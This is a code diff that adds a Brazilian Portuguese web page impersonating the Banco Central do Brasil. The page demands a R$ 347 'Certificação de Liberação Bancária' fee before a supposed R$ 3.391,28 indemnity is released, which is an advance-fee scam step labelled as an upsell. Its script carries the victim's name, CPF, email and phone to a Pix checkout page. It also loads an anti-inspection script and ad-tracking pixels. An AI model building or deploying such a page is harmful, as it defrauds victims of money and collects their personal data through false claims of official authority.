@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Certificação de Liberação Bancária</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f9;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    .container {
+      max-width: 720px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.15);
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+    .header img {
+      max-width: 140px;
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto 15px auto;
+    }
+    .header h1 {
+      font-size: 24px;
+      color: #002855;
+      margin: 0;
+    }
+    .highlight {
+      background: #eaf4ff;
+      border-left: 6px solid #0056b3;
+      padding: 15px;
+      margin: 25px 0;
+      font-size: 16px;
+      line-height: 1.6;
+      border-radius: 8px;
+    }
+    .value-box {
+      background: #fef9e7;
+      border: 1px solid #f7dc6f;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: center;
+      font-size: 18px;
+      border-radius: 10px;
+    }
+    .cta {
+      text-align: center;
+      margin-top: 25px;
+    }
+    .cta a {
+      display: inline-block;
+      background: #007bff;
+      color: #fff;
+      text-decoration: none;
+      padding: 16px 40px;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      width: 100%;
+      max-width: 320px;
+    }
+    .cta a:hover {
+      background: #0056b3;
+    }
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: #777;
+      margin-top: 25px;
+    }
+
+    /* Responsividade */
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 20px;
+      }
+      .header h1 {
+        font-size: 20px;
+      }
+      .highlight {
+        font-size: 14px;
+      }
+      .value-box {
+        font-size: 16px;
+        padding: 15px;
+      }
+      .cta a {
+        font-size: 16px;
+        padding: 14px 20px;
+      }
+    }
+  </style>
+<!-- Meta Pixel g26 -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1094955653523354');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1094955653523354&ev=PageView&noscript=1" /></noscript>
+<!-- Utmify g26 -->
+<script>
+window.pixelId = "I3rkjjxZonP50FzjkStNJrm899HjlSfkD1JZ";
+var _utmify_g26 = document.createElement("script");
+_utmify_g26.setAttribute("async", "");
+_utmify_g26.setAttribute("defer", "");
+_utmify_g26.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+document.head.appendChild(_utmify_g26);
+</script>
+
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="../../assets/images/logo-bcb-upsell.png" alt="logo-bcb-1">
+      <h1>Certificação de Liberação Bancária (CLB)</h1>
+    </div>
+
+    <p>Prezado beneficiário,</p>
+    <p>Para que o valor de <strong>R$ 3.391,28</strong> seja liberado em sua conta, é obrigatória a emissão da <strong>Certificação de Liberação Bancária (CLB)</strong>. Este documento oficial é exigido para transferências superiores a R$ 3.000,00, garantindo que não haja bloqueios automáticos pelo sistema bancário.</p>
+
+    <div class="highlight">
+      ✅ A <strong>CLB</strong> será emitida diretamente em seu CPF e vinculada ao processo de indenização, autorizando a transferência imediata do valor.
+    </div>
+
+    <div class="value-box">
+      Taxa única de emissão da CLB: <br>
+      <strong>R$ 347,00</strong>  
+      <br><br>
+      <small>(valor com desconto aplicado devido às etapas já quitadas)</small>
+    </div>
+
+    <p>Após a confirmação da taxa, sua indenização será automaticamente liberada, com crédito imediato na conta bancária informada.</p>
+
+    <div class="cta">
+      <a href="#" id="btnCheckout">🔒 Emitir CLB e Liberar R$ 3.391,28</a>
+    </div>
+
+    <div class="footer">
+      © 2025 Banco Central do Brasil - Certificação de Transferências.  
+    </div>
+  </div>
+
+  <script>
+function getParams() {
+  const params = {};
+  const query = window.location.search.substring(1).split("&");
+  query.forEach(part => {
+    const [key, value] = part.split("=");
+    if (key) params[key] = decodeURIComponent((value || "").replace(/\+/g, " "));
+  });
+  return params;
+}
+
+function redirectToCheckout(e) {
+  e.preventDefault();
+  const params = getParams();
+
+  const checkoutBase = "../pagamento/pix.html?produto=up8"; // seu link do checkout
+
+  const checkoutParams = new URLSearchParams({
+    name: params.name || "",
+    document: params.document || "",
+    email: params.email || "",
+    telephone: params.telephone || ""
+  });
+
+  if (params.utm_source) checkoutParams.set("utm_source", params.utm_source);
+  if (params.utm_campaign) checkoutParams.set("utm_campaign", params.utm_campaign);
+
+  window.location.href = checkoutBase + "?" + checkoutParams.toString();
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  const btn = document.querySelector("#btnCheckout");
+  if (btn) {
+    btn.addEventListener("click", redirectToCheckout);
+  }
+});
+</script>
+
+<script src="../assets/js/up-checkout-local.js"></script>
+<script src="../assets/js/block-inspect.js" defer></script>
+</body>
+</html>
